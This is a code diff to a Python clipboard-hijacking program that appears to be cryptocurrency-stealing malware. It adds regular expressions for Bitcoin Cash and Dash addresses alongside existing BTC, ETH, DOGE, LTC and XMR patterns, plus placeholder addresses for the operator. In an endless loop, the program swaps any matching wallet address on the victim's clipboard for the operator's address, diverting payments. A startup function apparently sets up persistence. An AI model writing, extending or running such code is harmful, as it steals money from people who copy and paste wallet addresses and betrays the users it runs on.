@@ -8,6 +8,8 @@ ETH_address = "eth address here"
 DOGE_address = "doge address here"
 LTC_address = "ltc address here"
 XMR_address = "xmr address here"
+BCH_address = "bch address here"
+DASH_address = "dash address here"
 
 def startup():
     get_file_name = os.path.basename(__file__)
@@ -28,6 +30,8 @@ def match():
     doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
     ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
     xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
+    bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
+    dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
 
     if btc_match_1 or btc_match_2:
         pyperclip.copy(BTC_address)
@@ -39,6 +43,10 @@ def match():
         pyperclip.copy(LTC_address)
     elif xmr_match:
         pyperclip.copy(XMR_address)
+    elif bch_match:
+        pyperclip.copy(BCH_address)
+    elif dash_match:
+        pyperclip.copy(DASH_address)
 
 while True:
     match()
